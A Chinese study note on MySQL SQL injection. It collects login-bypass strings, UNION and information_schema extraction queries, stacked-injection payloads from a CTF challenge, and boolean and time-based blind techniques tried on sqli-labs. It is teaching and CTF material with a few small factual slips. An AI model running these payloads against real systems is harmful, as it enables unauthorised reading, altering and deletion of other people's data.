# SQL注入总结

## 基础知识

### 系统函数

> system\_user()——系统用户名
>
> user()——用户名
>
> current\_user()——当前用户名
>
> session\_user()——链接数据库的用户名
>
> database()——数据库名
>
> version()——数据库版本
>
> @@datadir——数据库路径
>
> @@basedir——数据库安装路径
>
> @@version\_conpile\_os——操作系统

### 字符串连接函数

> concat(str1,str2,...)——没有分隔符地连接字符串
>
> concat\_ws(separator,str1,str2,...)——含有分隔符地连接字符串
>
> group\_concat(str1,str2,...)——连接一个组的所有字符串，并以逗号分隔每一条数据。

### 一般用于尝试的语句

\--+可以用#替换，url 提交过程中Url 编码后的#为%23

```mysql
or 1=1--+
'or 1=1--+
"or 1=1--+
)or 1=1--+
')or 1=1--+
") or 1=1--+
"))or 1=1--+
一般的代码为：
$id=$_GET['id'];
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
```

此处考虑两个点，一个是闭合前面你的‘ 另一个是处理后面的‘ ，一般采用两种思路，闭合后面的引号或者注释掉，注释掉采用--+ 或者#（%23）

### union 操作符的介绍

联合查询是可合并多个相似的选择查询的结果集。等同于将一个表追加到另一个表，从而实现将两个表的查询组合到一起，使用谓词为UNION或UNION ALL。将多个查询的结果合并到一起（纵向合并）：字段数不变，多个查询的记录数合并。

基本语法：

> Select 语句
>
> Union \[union 选项\]
>
> Select 语句;
>
> Union选项：与select选项基本一样
>
> Distinct：去重，去掉完全重复的数据（默认的）
>
> All：保存所有的结果

```mysql
SELECT column_name(s) FROM table_name1
UNION [distinct] --默认为distinct
                 --如果允许重复值就改为All
SELECT column_name(s) FROM table_name2
```

union理论上只要保证字段数一样，不需要每次拿到的数据对应的字段类型一致。永远只保留第一个select语句对应的字段名字。

### sql 中的逻辑运算

```mysql
Select * from users where id=1 and 1=1;
```

 这条语句为什么能够选择出id=1的内容，and 1=1 到底起作用了没有？这里就要清楚sql 语句执行顺序了。  
同时这个问题我们在使用万能密码的时候会用到。Select *from admin where username=’admin’ and password=’admin’我们可以用’or 1=1# 作为密码输入。原因是为什么？这里涉及到一个逻辑运算，当使用上述所谓的万能密码后，构成的sql 语句为：Select* from admin where username=’admin’ and password=’’or 1=1#’  
 Explain:上面的这个语句执行后，我们在不知道密码的情况下就登录到了admin 用户了。原因是在where 子句后， 我们可以看到三个条件语句username=’admin’ andpassword=’’or 1=1。三个条件用and 和or 进行连接。在sql 中，我们and 的运算优先级大于or 的元算优先级。因此可以看到第一个条件（用a 表示）是真的，第二个条件（用b 表示）是假的，a and b = false,第一个条件和第二个条件执行and 后是假，再与第三个条件or 运算，因为第三个条件1=1 是恒成立的，所以结果自然就为真了。因此上述的语句就是恒真了。

![image-20210129214011558](https://cdn.jsdelivr.net/gh/cc-sql/imagbed/img/20210129214023.png)

①Select *from users where id=1 and 1=1;  
②Select * from users where id=1 && 1=1;  
③Select \* from users where id=1 & 1=1;  
上述三者有什么区别？①和②是一样的，表达的意思是id=1 条件和1=1 条件进行与运算。  
③的意思是id=1 条件与1 进行&位操作，id=1 被当作true，与1 进行& 运算结果还是1，再进行=操作，1=1,还是1（ps：&的优先级大于=）  
Ps:此处进行的位运算。我们可以将数转换为二进制再进行与、或、非、异或等运算。必要的时候可以利用该方法进行注入结果。例如将某一字符转换为ascii 码后，可以分别与1,2,4,8,16,32.。。。进行与运算，可以得到每一位的值，拼接起来就是ascii 码值。再从ascii 值反推回字符。（运用较少）

### order by介绍

在mysql中order by是用来根据校对规则对数据进行排序

基本语法：order by 字段 \[asc|desc\]; //asc升序，默认的

并且order by还可以多字段排序，先按照第一个字段进行排序，然后再按照第二个字段进行排序。

因此在sql注入中可以通过order by来判断表中有多少字段，并且并不需要知道字段的名字是什么，通过数字1、2、3等也可以排序，因为在mysql中字段的名字也可以用过1、2、3等来表示。

![image-20210129221840979](https://cdn.jsdelivr.net/gh/cc-sql/imagbed/img/20210129221845.png)

参数默认是asc，可以不用加。

![image-20210129221939426](https://cdn.jsdelivr.net/gh/cc-sql/imagbed/img/20210129221944.png)

当order by中的字段数为3时，由于表中字段数不足，则报错。因此可判断字段数为2.

### 注入流程

![image-20210129214327007](https://cdn.jsdelivr.net/gh/cc-sql/imagbed/img/20210129214330.png)

我们的数据库存储的数据按照上图的形式，一个数据库当中有很多的数据表，数据表当中有很多的列，每一列当中存储着数据。我们注入的过程就是先拿到数据库名，在获取到当前数据库名下的数据表，再获取当前数据表下的列，最后获取数据。

### 系统数据库（information\_schema）

 在mysql 5.0版本之后，mysql默认在数据库中存放一个"information\_schema"的数据库，在该库中，需要记住三个表名，分别是schemata、tables、cliumns。

 schemata表存储该用户创建的所有数据库的库名。

![image-20210129215328706](https://cdn.jsdelivr.net/gh/cc-sql/imagbed/img/20210129220007.png)

通过schemata表我们就可以猜数据库了

```mysql
select schema_name from information_schema.schemata;
```

tables表存储该用户创建的所有数据库的库名和表名。

![image-20210129215938771](https://cdn.jsdelivr.net/gh/cc-sql/imagbed/img/20210129215943.png)

通过tables表我们就可以猜某库的数据表

```mysql
select table_name from information_schema.tables where table_schema=’xxxxx’;
```

columns表存储该用户创建的所有数据库的库名、表名和字段名

![image-20210129220348844](https://cdn.jsdelivr.net/gh/cc-sql/imagbed/img/20210129220350.png)

通过columns表我们就可以猜某表的所有列

```mysql
Select column_name from information_schema.columns where table_name=’xxxxx’;
```

最后获取某列的数据

```mysql
Select xxxx from xxxx
```

**当information\_schema被屏蔽时，可使用其他的表**

可以参考这边文章：[https://www.anquanke.com/post/id/193512](https://www.anquanke.com/post/id/193512)

**innodb表**

MySQL 5.6 及以上版本存在`innodb_index_stats`，`innodb_table_stats`两张表，其中包含新建立的库和表

```mysql
select table_name from mysql.innodb_table_stats where database_name = database(); 
select table_name from mysql.innodb_index_stats where database_name = database();
```

**sys表**

在MySQL 5.7.9中sys中新增了一些视图，可以从中获取表名

```mysql
#包含in
SELECT object_name FROM `sys`.`x$innodb_buffer_stats_by_table` where object_schema = database();
SELECT object_name FROM `sys`.`innodb_buffer_stats_by_table` WHERE object_schema = DATABASE();
SELECT TABLE_NAME FROM `sys`.`x$schema_index_statistics` WHERE TABLE_SCHEMA = DATABASE();
SELECT TABLE_NAME FROM `sys`.`schema_auto_increment_columns` WHERE TABLE_SCHEMA = DATABASE();
SELECT table_schema FROM sys.schema_table_statistics GROUP BY table_schema;
#不包含in
SELECT TABLE_NAME FROM `sys`.`x$schema_flattened_keys` WHERE TABLE_SCHEMA = DATABASE();
SELECT TABLE_NAME FROM `sys`.`x$ps_schema_table_statistics_io` WHERE TABLE_SCHEMA = DATABASE();
SELECT TABLE_NAME FROM `sys`.`x$schema_table_statistics_with_buffer` WHERE TABLE_SCHEMA = DATABASE();
SELECT table_schema FROM sys.x$schema_flattened_keys GROUP BY table_schema;
#通过表文件的存储路径获取表名
SELECT FILE FROM `sys`.`io_global_by_file_by_bytes` WHERE FILE REGEXP DATABASE();
SELECT FILE FROM `sys`.`io_global_by_file_by_latency` WHERE FILE REGEXP DATABASE();
SELECT FILE FROM `sys`.`x$io_global_by_file_by_bytes` WHERE FILE REGEXP DATABASE();

#查询指定库的表（若无则说明此表从未被访问）
SELECT table_name FROM sys.schema_table_statistics WHERE table_schema='mspwd' GROUP BY table_name;
SELECT table_name FROM sys.x$schema_flattened_keys WHERE table_schema='mspwd' GROUP BY table_name;
#统计所有访问过的表次数:库名,表名,访问次数
select table_schema,table_name,sum(io_read_requests+io_write_requests) io from sys.schema_table_statistics group by
table_schema,table_name order by io desc;
#查看所有正在连接的用户详细信息
SELECT user,db,command,current_statement,last_statement,time FROM sys.session;
#查看所有曾连接数据库的IP,总连接次数
SELECT host,total_connections FROM sys.host_summary;
```

包含之前查询记录的表

```mysql
SELECT QUERY FROM sys.x$statement_analysis WHERE QUERY REGEXP DATABASE();
SELECT QUERY FROM `sys`.`statement_analysis` where QUERY REGEXP DATABASE();
```

performance\_schema表

```mysql
SELECT object_name FROM `performance_schema`.`objects_summary_global_by_type` WHERE object_schema = DATABASE();
SELECT object_name FROM `performance_schema`.`table_handles` WHERE object_schema = DATABASE();
SELECT object_name FROM `performance_schema`.`table_io_waits_summary_by_index_usage` WHERE object_schema = DATABASE();
SELECT object_name FROM `performance_schema`.`table_io_waits_summary_by_table` WHERE object_schema = DATABASE();
SELECT object_name FROM `performance_schema`.`table_lock_waits_summary_by_table` WHERE object_schema = DATABASE();
```

包含之前查询记录的表

```mysql
SELECT digest_text FROM `performance_schema`.`events_statements_summary_by_digest` WHERE digest_text REGEXP DATABASE();
```

包含表文件路径的表

```mysql
SELECT file_name FROM `performance_schema`.`file_instances` WHERE file_name REGEXP DATABASE();
```

| 视图->列名（sys库中的表名->列名）例子：select host from sys host\_summary; | 说明                                             |
| ------------------------------------------------------------ | ------------------------------------------------ |
| host\_summary -> host、total\_connections                    | 历史连接IP、对应IP的连接次数                     |
| innodb\_buffer\_stats\_by\_schema -> object\_schema          | 库名                                             |
| innodb\_buffer\_stats\_by\_table -> object\_schema、object\_name | 库名、表名(可指定)                               |
| io\_global\_by\_file\_by\_bytes -> file                      | 路径中包含库名                                   |
| io\_global\_by\_file\_by\_latency -> file                    | 路径中包含库名                                   |
| processlist -> current\_statement、last\_statement           | 当前数据库正在执行的语句、该句柄执行的上一条语句 |
| schema\_auto\_increment\_columns -> table\_schema、table\_name、column\_name | 库名、表名、列名                                 |
| schema\_index\_statistics -> table\_schema、table\_name      | 库名、表名                                       |
| schema\_object\_overview -> db                               | 库名                                             |
| schema\_table\_statistics -> table\_schema、table\_name      | 库名、表名                                       |
| schema\_table\_statistics\_with\_buffer -> table\_schema、table\_name | 库名、表名                                       |
| schema\_tables\_with\_full\_table\_scans -> object\_schema、object\_name | 库名、表名(全面扫描访问)                         |
| session -> current\_statement、last\_statement               | 当前数据库正在执行的语句、该句柄执行的上一条语句 |
| statement\_analysis -> query、db                             | 数据库最近执行的请求、对于请求访问的数据库名     |
| statementswith\* -> query、db                                | 数据库最近执行的特殊情况的请求、对应请求的数据库 |
| version -> mysql\_version                                    | mysql版本信息                                    |
| x$innodb\_buffer\_stats\_by\_schema                          | 同innodb\_buffer\_stats\_by\_schema              |
| x$innodb\_buffer\_stats\_by\_table                           | 同innodb\_buffer\_stats\_by\_table               |
| x$io\_global\_by\_file\_by\_bytes                            | 同io\_global\_by\_file\_by\_bytes                |
| x$schema\_flattened\_keys -> table\_schema、table\_name、index\_columns | 库名、表名、主键名                               |
| x$ps\_schema\_table\_statistics\_io -> table\_schema、table\_name、count\_read | 库名、表名、读取该表的次数                       |

上诉表格中虽然有能够查列名的表，但是查出来的数据都不全，当知道`flag`所在的库和表名时，但无法获取到列名，就需要利用**无列名盲注了**

## select被过滤

```mysql
mysql 8.0.19`新增语句`table
TABLE table_name [ORDER BY column_name] [LIMIT number [OFFSET number]]
```

可以把`table t`简单理解成`select * from t`，和`select`的区别在于

+   `table`总是显示表的所有列
+   `table`不允许任何的行过滤;也就是说，`TABLE`不支持任何`WHERE`子句。  
    可以用来盲注表名

```mysql
admin'and\x0a(table\x0ainformation_schema.TABLESPACES_EXTENSIONS\x0alimit\x0a7,1)>
(BINARY('{}'),'0')#
```

同时代替`select`被过滤导致只能同表查询的问题

PS：新增的`values`语句也挺有意思，在某些情况似乎可以代替`union`或`select`进行`order by`盲注

## 联合查询的类型

union 联合注入，union 的作用是将两个sql 语句进行联合。Union 可以从下面的例子中可以看出，强调一点：union 前后的两个sql 语句的选择列数要相同才可以。Union all 与union 的区别是增加了去重的功能。

并且运用information\_schema的知识。

sql-labs/less-1

字符型报错

```mysql
//order by判断字段
http://127.0.0.1/sqli-labs/Less-1/?id=-1' or 1=1 order by 3 --+
//通过union select判断显示的是哪些字段
http://127.0.0.1/sqli-labs/Less-1/?id=-1' union select 1,2,3 --+
//通过information_schema爆数据库
http://127.0.0.1/sqli-labs/Less-1/?id=-1'  union select 1,database(),group_concat(schema_name) from information_schema.schemata --+
//爆数据表
```

admin'or(updatexml(1,concat(version()),1)or'1'like'1

select(group\_concat(table\_name)from(infromation\_schema.table)where(table\_schema)like('geek'))

select(group\_concat(table\_name)from(information\_schema.tables)where(table\_schema)like('geek'))

sql-labs/less-2

整数报错

与less-1差不多 将’去除即可

sql-labs/less-3

可以成功注入的有：

> ') or '1'=('1'  
> ) or 1=1 --+

将less1 中的' 添加）即可 '）

sql-labs/less-4

可以成功注入的有：

> “) or ”1”=(“1  
> “) or 1=1 --+

将less1 中的‘ 更换为“)

sql-labs/less-5

## 堆查询注射

堆叠注入。从名词的含义就可以看到应该是一堆sql 语句（多条）一起执行。而在真实的运用中也是这样的，我们知道在mysql 中，主要是命令行中，每一条语句结尾加; 表示语句结束。这样我们就想到了是不是可以多句一起使用。这个叫做stacked injection。

### 原理介绍

在SQL 中，分号（;）是用来表示一条sql 语句的结束。试想一下我们在; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而unioninjection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union或者union all 执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。

例如以下这个例子。

![image-20210201141157211](https://cdn.jsdelivr.net/gh/cc-sql/imagbed/img/20210201141159.png)

当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。

### 堆叠注入的局限性

堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到API 或者数据库引擎不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。

虽然我们前面提到了堆叠查询可以执行任意的sql 语句，但是这种注入方式并不是十分的完美的。在我们的web 系统中，因为代码通常只返回一个查询结果，因此，堆叠注入第二个语句产生错误或者结果只能被忽略，我们在前端界面是无法看到返回结果的。因此，在读取数据时，我们建议使用union（联合）注入。同时在使用堆叠注入之前，我们也是需要知道一些数据库相关信息的，例如表名，列名等信息。可考虑使用RENAME关键字，将想要的数据列名/表名更改成返回数据的SQL语句所定义的表/列名。

```php
以PHP为例，使用的条件为
$mysqli->multi_query($sql);
```

使用堆叠注入时，可使用的方法：

当过滤`select`时，可使用`handler`语句。`handler`语句并不具备`select`语句的所有功能。它是`mysql`专用的语句，并没有包含到`SQL`标准中

```mysql
handler users open as hd; #指定数据表进行载入并将返回句柄重命名
handler hd read first; #读取指定表/句柄的首行数据
handler hd read next; #读取指定表/句柄的下一行数据
handler hd close; #关闭句柄
```

预处理：

```mysql
prepare xxx from "sql语句";
execute xxx;

由于sql语句是字符串，因此可以使用操作字符串的函数，绕过一些过滤
比如过滤了select
PREPARE st from concat('s','elect', ' * from `1919810931114514`');EXECUTE st;#
```

### 例子

#### 强网杯随便注

```mysql
1';show tables;#  看有什么表在里面
1';show columns from `1919810931114514`;#  看列
1';show columns from `words`;# 可以发现这个表是可以回显内容的
我们可以用函数将1919810931114514表改成words表，来让他自动回显
RENAME TABLE `words` TO `words1`;
RENAME TABLE `1919810931114514` TO `words`;
ALTER TABLE `words` CHANGE `flag` `id` VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;#将新words表的flag改为id避免开始无法查询
接下来还有
预处理语句使用方法
PREPARE name from '[my sql sequece]';   //预定义SQL语句
EXECUTE name;  //执行预定义SQL语句
(DEALLOCATE || DROP) PREPARE name;  //删除预定义SQL语句

SET @tn = 'hahaha';  //存储表名
SET @sql = concat('select * from ', @tn);  //存储SQL语句
PREPARE name from @sql;   //预定义SQL语句
EXECUTE name;  //执行预定义SQL语句
(DEALLOCATE || DROP) PREPARE sqla;  //删除预定义SQL语句

由于过滤了select
可以用chr()
最后payload:

最终payload
1';PREPARE jwt from concat(char(115,101,108,101,99,116), ' * from `1919810931114514` ');EXECUTE jwt;#

1';HANDLER FlagHere OPEN;HANDLER FlagHere READ FIRST;HANDLER FlagHere CLOSE;#
```

## 无列名盲注

当我们无法获取字段时，比如information\_schema被过滤，可使用无列名注入

### 使用`union select重命名法`

```mysql
mysql> select * from users;
+----+----------+------------+
| id | username | password   |
+----+----------+------------+
|  1 | Dumb     | Dumb       |
|  2 | Angelina | I-kill-you |
+----+----------+------------+
2 rows in set (0.00 sec)

mysql> select 1,2,3 union select * from users;
+----+----------+------------+
| 1  | 2        | 3          |
+----+----------+------------+
|  1 | 2        | 3          |
|  1 | Dumb     | Dumb       |
|  2 | Angelina | I-kill-you |
+----+----------+------------+
3 rows in set (0.00 sec)
#对比可以发现使用union时，列名被替换为前面的select的列名了，为1，2，3。
mysql> select a.1 from (select 1,2,3 union select * from users) a;
+---+
| 1 |
+---+
| 1 |
| 1 |
| 2 |
+---+
3 rows in set (0.00 sec)
#将前面生成的表重命名为a，再使用select a.1，查询第一列的值
#可以看到，使用union查询，在不知道列名的情况下，依然能够将列注入出来，通过1，2，3选择第几列
```

```mysql
select c from (select 1 as a, 1 as b, 1 as c union select * from test)x limit 1 offset 1;
select a.`3` from(select 1,2,3 union select * from admin)a limit 1,1;

//无逗号，有join版本
select a from (select * from (select 1 `a`)m join (select 2 `b`)n join (select 3 `c`)t where 0 union select * from test)x;
```

### 比较法

```mysql
mysql> select 'b' < 'azzzzz';
+----------------+
| 'b' < 'azzzzz' |
+----------------+
|              0 |
+----------------+
1 row in set (0.00 sec)

mysql> select 'ab' < 'azzzzz'
    -> ;
+-----------------+
| 'ab' < 'azzzzz' |
+-----------------+
|               1 |
+-----------------+
1 row in set (0.00 sec)
#mysql比较，从第一个字符还是比较ascii的大小，一次往后
#并且多列的比较时从第一列的第一位开始的
mysql> select (select 1,'Dumb','a')> (select * from users limit 1);
+------------------------------------------------------+
| (select 1,'Dumb','a')> (select * from users limit 1) |
+------------------------------------------------------+
|                                                    0 |
+------------------------------------------------------+
1 row in set (0.00 sec)

mysql> select (select 1,'Dumb','b') > (select * from users limit 1);
+-------------------------------------------------------+
| (select 1,'Dumb','b') > (select * from users limit 1) |
+-------------------------------------------------------+
|                                                     0 |
+-------------------------------------------------------+
1 row in set (0.00 sec)

mysql> select (select 1,'Dumb','D') > (select * from users limit 1);
+-------------------------------------------------------+
| (select 1,'Dumb','D') > (select * from users limit 1) |
+-------------------------------------------------------+
|                                                     0 |
+-------------------------------------------------------+
1 row in set (0.00 sec)

mysql> select (select 1,'Dumb','F') > (select * from users limit 1);
+-------------------------------------------------------+
| (select 1,'Dumb','F') > (select * from users limit 1) |
+-------------------------------------------------------+
|                                                     1 |
+-------------------------------------------------------+
1 row in set (0.00 sec)
#通过比较可以将三列的数据全部盲注出来
```

```mysql
((SELECT 1,concat('{result+chr(mid)}', cast("0" as JSON)))<(SELECT * FROM `f1ag_1s_h3r3_hhhhh`))
```

要求后面select的结果必须是一行，可以通过limit限制一行。mysql中对char型大小写是不敏感的，盲注的时候要么可以使用`hex`或者`binary`。

## SQL 盲注

何为盲注？盲注就是在sql 注入过程中，sql 语句执行的选择后，选择的数据不能回显到前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。

### 基于布尔SQL 盲注

#### Sql注入截取字符串常用函数

在sql注入中，往往会用到截取字符串的问题，例如不回显的情况下进行的注入，也成为盲注，这种情况下往往需要一个一个字符的去猜解，过程中需要用到截取字符串。

**mid()**

> mid(s,n,len);
>
> 从字符串 s 的 n 位置截取长度为 len 的子字符串

```mysql
SELECT MID("RUNOOB", 2, 3) AS ExtractString; 
-- UNO
```

**substr()/substring()**

> substr(s, start, length);
>
> substring(s, start, length)
>
> 从字符串 s 的 start 位置截取长度为 length 的子字符串

```mysql
SELECT MID("RUNOOB", 2, 3) AS ExtractString; 
-- UNO                                
```

**left()**

> left(s,n);
>
> 返回字符串 s 的前 n 个字符

```mysql
SELECT LEFT('runoob',2);
-- ru
```

**right()**

> right(s,n);
>
> 返回字符串 s 的后 n 个字符

```mysql
SELECT right('runoob',2);
-- ob
```

**ascii()/ord()**

> ascii(s);/ord(s);
>
> 返回字符串 s 的第一个字符的 ASCII 码。
>
> 这里不考虑多字节字符，比如汉字

**trim()/rtrim()/ltrim()**

> ltrim(s);
>
> 去掉字符串s开始处的空格
>
> rtrim(s);
>
> 去掉字符串s结尾处的空格
>
> trim(s);
>
> 去掉字符串开始和结尾处的空格

```mysql
SELECT TRIM('    RUNOOB    ') AS TrimmedString;
-- RUNOOB

SELECT RTRIM("RUNOOB     ") AS RightTrimmedString;   
-- RUNOOB

SELECT LTRIM("    RUNOOB") AS LeftTrimmedString;
-- RUNOOB
```

这个怎么用来截取字符串呢？

```mysql
TRIM([BOTH/LEADING/TRAILING] 目标字符串 FROM 源字符串）
BOTH删除两边的指定字符串
LEADING删除左边的指定字符串
TARILING删除右边的指定字符串
select trim(LEADING "a" from "abcd") = trim(LEADING "b" from "abcd");
以这个为例，我们将删除的字符串ASCII差限制在1，例如a和b
当这个结果返回0时，则第一个字符是a或者b。
接着让a的ASCII+2变成c，如果返回1，则字符串第一位为a，反之第一位为b。这样做的目的是为了方便写脚本
第二个字符判断
select trim(LEADING "aa" from "abcd") = trim(LEADING "ab" from "abcd");
接着重复上面的过程，判断第二个字符
以此推出整个字符串

如果=用regexp替代那么正确的字符一定在regexp前面以这个abcd为例
Trim(leading ‘a’ from ‘abcd’) regexp trim(LEADING ‘x’ from ‘abcd’)
就是bcd regexp abcd返回0， 如果反过来就是abcd regexp bcd 返回1
因此只需判断第一步即可，而不需要ASCII+2去判断了

注：y1ng师傅在[HFCTF 2021 Final]hatenum中用到了这个方法，通过持续递归，多次套娃trim。如果字符串长度被限制，可使用。一次只截断几个字符
例如：
select trim(LEADING "b" from trim(LEADING "a" from "abcd"));
-- cd
先截断a，返回字符串bcd，在截断b，返回字符串cd
```

**注：可以看到这个函数可以不使用`,`的，如果`,`被过滤可以使用**

**INSERT()**

> INSERT(s1,x,len,s2)
>
> 字符串 s2 替换 s1 的 x 位置开始长度为 len 的字符串

```mysql
SELECT INSERT("google.com", 1, 6, "runoob");  
-- 输出：runoob.com
SELECT INSERT("google.com", 1,2, "runoob");
-- 输出：runoobogle.com
如何使用呢？
第一步删除起始的前x位
第二步套娃删除x+1位以后的所有
根据这两步我们就能取出字符串的任意位置的字符，也就相当于字符串的截取
例子：第一步删除起始的前x位
SELECT INSERT("abcdef", 1,0, "");
-- 输出：abcdef
SELECT INSERT("abcdef", 1,1, "");
-- 输出：bcdef
第二步套娃删除x+1位以后的所有
SELECT INSERT((INSERT("abcdef", 1,0, "")),2,9999,"");
-- 输出：a
SELECT INSERT((INSERT("abcdef", 1,1, "")),2,9999,"");
-- 输出：b

可以看到我们只要改变中间的数字，就可以输出任意位置的字符
```

**注：TRIM和INSERT函数比较特别，基本上是不会被过滤了，如果常用的截取函数不能用时，可选择这两个函数**

**if/case**

用在select查询当中，当做一种条件来进行判断

基本语法：if(条件,为真结果,为假结果)

![image-20210130172221391](https://cdn.jsdelivr.net/gh/cc-sql/imagbed/img/20210130172224.png)

**case基本语法**

```php
MySQL 的 case when 的语法有两种：
简单函数 
CASE [col_name] WHEN [value1] THEN [result1]…ELSE [default] END
搜索函数 
CASE WHEN [expr] THEN [result1]…ELSE [default] END

select case 'a' when 'a' then 1 else 0 end;
-- 1

select case when 98>12 then 1 else 0 end;
```

**注：可以看出case的用法与if类似，当if被过滤或者`,`被过滤可以替换为case，并且在时间盲注中，条件语句非常有用！**

#### **regexp/rlike 正则表达式注入**

用法介绍：select user() regexp '^\[a-z\]';  
Explain：正则表达式的用法，user()结果为root，regexp 为匹配root 的正则表达式。  
第二位可以用select user() regexp '^ro'来进行。

结果返回0或者1.

**示例介绍：**

```mysql
select * from users where id=1 and 1=(if((user() regexp '^r'),1,0));
select * from users where id=1 and 1=(user() regexp'^ri');
```

通过if 语句的条件判断，返回一些条件句，比如if 等构造一个判断。根据返回结果是否等于0 或者1 进行判断。

```mysql
select * from users where id=1 and 1=(select 1 from information_schema.tables
where table_schema='security' and table_name regexp '^us[a-z]' limit 0,1);
```

这里利用select 构造了一个判断语句。我们只需要更换regexp 表达式即可

'^u\[a-z\]' -> '^us\[a-z\]' -> '^use\[a-z\]' -> '^user\[a-z\]' -> FALSE

如何知道匹配结束了？这里大部分根据一般的命名方式（经验）就可以判断。但是如何你在无法判断的情况下，可以用table\_name regexp '^username$'来进行判断。^是从开头进行匹配，$是从结尾开始判断。更多的语法可以参考mysql 使用手册进行了解。

但是这种做法是错误的，limit 作用在前面的select 语句中，而不是regexp。那我们该如何选择。其实在regexp 中我们是取匹配table\_name 中的内容，只要table\_name 中有的内容，我们用regexp 都能够匹配到。因此上述语句不仅仅可以选择user，还可以匹配其他项。

\*\*注：`**regexp是不区分大小写的，需要大小写敏感需要加上binary关键字`

```mysql
select binary database() regexp "^CTF";
```

#### **like 匹配注入**

和上述的正则类似，mysql 在匹配的时候我们可以用like 进行匹配S。

这里可以用于过滤`=`使用

用法：select user() like ‘ro%’;

![image-20210130173134947](https://cdn.jsdelivr.net/gh/cc-sql/imagbed/img/20210130173142.png)

### 基于时间的SQL 盲注延时注入

```mysql
If(ascii(substr(database(),1,1))>115,0,sleep(5))%23
--if 判断语句，条件为假，执行sleep
```

Ps：遇到以下这种利用sleep()延时注入语句

```mysql
select sleep(find_in_set(mid(@@version, 1, 1), '0,1,2,3,4,5,6,7,8,9,.'));
```

该语句意思是在0-9 之间找版本号的第一位。但是在我们实际渗透过程中，这种用法是不可取的，因为时间会有网速等其他因素的影响，所以会影响结果的判断。

**benchmark**

MySQL有一个内置的BENCHMARK()函数，可以测试某些特定操作的执行速度。参数可以是需要执行的次数和表达式。表达式可以是任何的标量表达式，比如返回值是标量的子查询或者函数。该函数可以很方便地测试某些特定操作的性能，比如通过测试可以发现，MD5()函数比SHAI()函数要快

```mysql
select benchmark(1000000,sha1(sha1(sha1(sha1("1")))));
```

```mysql
UNION SELECT IF(SUBSTRING(current,1,1)=CHAR(119),BENCHMARK(5000000,ENCODE(‘MSG’,’by 5 seconds’)),null) FROM (select database() as current) as tb1;
```

**笛卡儿积**

这种方法又叫做heavy query，可以通过选定一个大表来做笛卡儿积，但这种方式执行时间会几何倍数的提升，在站比较大的情况下会造成几何倍数的效果，实际利用起来非常不好用。

1.`count()`函数是用来统计表中记录的一个函数，返回匹配条件的行数。  
2.`count()`语法：  
（1）`count(*)`\---包括所有列，返回表中的记录数，相当于统计表的行数，在统计结果的时候，不会忽略列值为NULL的记录。  
（2）`count(1)`\---忽略所有列，1表示一个固定值，也可以用`count(2)`、`count(3)`代替，在统计结果的时候，不会忽略列值为`NULL`的记录。  
（3）`count(列名)`\---只包括列名指定列，返回指定列的记录数，在统计结果的时候，会忽略列值为NULL的记录（不包括空字符串和0），即列值为NULL的记录不统计在内。  
（4）`count(distinct 列名)`\---只包括列名指定列，返回指定列的不同值的记录数，在统计结果的时候，在统计结果的时候，会忽略列值为NULL的记录（不包括空字符串和0），即列值为NULL的记录不统计在内。  
3.`count(*)&count(1)&count(列名)`执行效率比较：  
（1）如果列为主键，`count(列名)`效率优于`count(1)`  
（2）如果列不为主键，`count(1)`效率优于`count(列名)`  
（3）如果表中存在主键，`count(主键列名)`效率最优  
（4）如果表中只有一列，则`count(*)`效率最优  
（5）如果表有多列，且不存在主键，则`count(1)`效率优于`count(*)`

```mysql
select count(*) from information_schema.columns A;
1 row in set (1.47 sec)
```

**get\_lock**

```mysql
SELECT GET_LOCK(key, timeout) FROM DUAL;
SELECT RELEASE_LOCK(key) FROM DUAL;
```

其中GET\_LOCK()和RELEASE\_LOCK()分别是两个函数，并且有参数和返回值，这里的DUAL是伪表，在Oracle中很常见，就是一个不存在的表，用来临时记录值的。

+ GET\_LOCK有两个参数，一个是key，就是根据这个参数进行加锁的，另一个是等待时间(s)，即获取锁失败后等待多久回滚事务。

  这里假设连接A先GET\_LOCK("lock\_test", 10)，因为lock\_test这个字段在之前没有加锁所以不需要等待，直接返回1，加锁成功。  
  然后连接B再GET\_LOCK("lock\_test", 10)，等待10s，若这期间没有释放这个字段的锁，则10s过后返回0，连接B加锁失败。  
  这里的问题就是这个加锁方式很危险，一旦加锁之后忘记释放，就会一直锁住这个字段，除非连接断开。尤其是第二个参数，千万不要理解成超时时间，并不是设置一个字段的锁，然后超过这个时间就自动释放了，这个是等待时间，即第二次对同一个字段加锁，等待多久然后返回。

+ 这个RELEASE\_LOCK就没什么好说的了，记得加锁之后释放就可以了，成功释放回返回1。

在一个连接session中可以先锁定一个变量，例如：`select get_lock('aaa',1);`

然后再通过另一个连接session，再次执行get\_lock函数：`select get_lock('aaa',2);`，此时将产生2秒的延时。

```mysql
//第一个连接
mysql> select get_lock('aaa',1);
+-------------------+
| get_lock('aaa',1) |
+-------------------+
|                 1 |
+-------------------+
1 row in set (0.00 sec)
//打开另一个cmd  再次连接mysql，执行get_lock，发现延时
mysql> select get_lock('aaa',1);
+-------------------+
| get_lock('aaa',1) |
+-------------------+
|                 0 |
+-------------------+
1 row in set (1.00 sec)
```

利用场景是有条件限制的：需要提供长连接。在`Apache+PHP`搭建的环境中需要使用`mysql_pconnect(打开一个到 MySQL 服务器的持久连接)`函数来连接数据库。在CTF中，只有出题人很刻意的使用这个函数，才暗示使用这个

**正则表达式**

正则匹配在匹配较长字符串单自由度比较高的字符串时，会有大量的回溯，造成较大的计算量

```mysql
select rpad('a',4999999,'a') RLIKE concat(repeat('(a.*)+',30),'b');

mysql> select rpad('a',4999999,'a') RLIKE concat(repeat('(a.*)+',30),'b');
+-------------------------------------------------------------+
| rpad('a',4999999,'a') RLIKE concat(repeat('(a.*)+',30),'b') |
+-------------------------------------------------------------+
|                                                           0 |
+-------------------------------------------------------------+
1 row in set (2.94 sec)
```

![image-20210130174634176](https://cdn.jsdelivr.net/gh/cc-sql/imagbed/img/20210130174643.png)

### 基于报错的SQL 盲注

报错注入在没法用union联合查询时用，但前提还是不能过滤一些关键的函数

报错注入就是利用了数据库的某些机制，认为的制造错误条件，使得查询结果能够  
出现在错误信息中。

